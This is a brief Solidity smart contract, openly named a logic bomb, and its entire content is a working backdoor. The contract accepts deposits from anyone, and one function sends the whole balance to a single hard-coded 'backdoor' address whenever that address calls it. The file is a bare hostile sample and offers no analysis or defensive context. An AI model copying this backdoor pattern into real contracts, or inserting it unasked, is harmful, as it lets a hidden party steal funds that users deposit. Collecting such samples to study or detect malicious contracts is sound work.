// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract AddressBasedLogicBomb {
    address public backdoor;

    constructor(address _backdoor) {
        backdoor = _backdoor;
    }

    function secretAccess() external {
        // Logic bomb triggers only for specific address
        if (msg.sender == backdoor) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
